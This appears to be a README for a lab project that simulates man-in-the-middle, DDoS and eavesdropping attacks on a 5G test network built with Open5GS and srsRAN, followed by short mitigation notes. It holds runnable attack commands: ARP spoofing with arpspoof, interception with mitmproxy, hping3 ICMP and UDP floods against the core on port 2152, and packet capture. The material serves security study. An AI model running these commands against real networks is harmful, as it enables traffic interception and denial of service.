## **Scope of Work**

### **Objective**
This project explores security challenges in 5G networks, focusing on:
1. **Man-in-the-Middle (MitM) Attacks**
2. **Distributed Denial of Service (DDoS) Attacks**
3. **Eavesdropping Threats**

### **Key Components**
1. **Threat Identification**  
   Understanding the vulnerabilities and risks posed by the selected threats in 5G networks.

2. **Simulation of Attacks**  
   Using **Open5GS** and **srsRAN**, the project simulates these attacks to study their impact on:
   - The **Core Network**.
   - The **Radio Access Network (RAN)**.

3. **Implementation of Mitigation Solutions**  
   Designing and implementing basic security solutions:
   - **Encryption mechanisms** for eavesdropping prevention.
   - **Intrusion Detection Systems (IDS)** for DDoS prevention.
   - **Secure authentication** for mitigating MitM attacks.

4. **Deliverables**
   - A detailed analysis of threats.
   - Simulations demonstrating the impact and behavior of attacks.
   - Mitigation solutions with demonstrated effectiveness.
   - A comprehensive project report summarizing findings and recommendations.

## **Installation and Configuration**

### **Open5GS Installation**
```bash
sudo apt update
sudo apt install software-properties-common
sudo add-apt-repository ppa:open5gs/latest
sudo apt update
sudo apt install open5gs
```

### **srsRAN Installation**
```bash
sudo add-apt-repository ppa:softwareradiosystems/srsran-project
sudo apt update
sudo apt install srsran-project -y
```

## **Simulated Attacks**

### **1. Man-in-the-Middle (MitM) Attack**
Intercept and manipulate communication between the UE and core network.

#### **Steps**
1. **Enable IP forwarding:**
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```
2. **Redirect traffic using ARP spoofing:**
   ```bash
   sudo arpspoof -i ogstun -t 10.45.0.2 10.45.0.1
   sudo arpspoof -i ogstun -t 10.45.0.1 10.45.0.2
   ```
3. **Intercept HTTP traffic using mitmproxy:**
   ```bash
   mitmproxy -p 8080
   ```

## **2. Distributed Denial of Service (DDoS) Attack**
Overload the UE or core network with traffic.

#### **Steps**
1. **Flood the UE with ICMP traffic:**
   ```bash
   sudo hping3 -1 -i u1000 10.45.0.2
   ```
2. **Flood the core network with UDP packets:**
   ```bash
   sudo hping3 -p 2152 --udp 10.45.0.1
   ```

## **3. Eavesdropping Attack**
Capture unencrypted traffic using tcpdump or Wireshark.

#### **Steps**
1. **Start packet capture:**
   ```bash
   sudo tcpdump -i ogstun -w capture.pcap
   ```
2. **Analyze packets using Wireshark:**
   ```bash
   wireshark capture.pcap
   ```

## **Mitigation Solutions**

### **Encryption**
- Use TLS for securing HTTP traffic.
- Ensure end-to-end encryption between the UE and core network.

### **Intrusion Detection**
- Deploy an IDS (e.g., Suricata) to monitor and block suspicious traffic patterns.

### **Authentication**
- Implement mutual authentication with strong cryptographic mechanisms to prevent MitM.
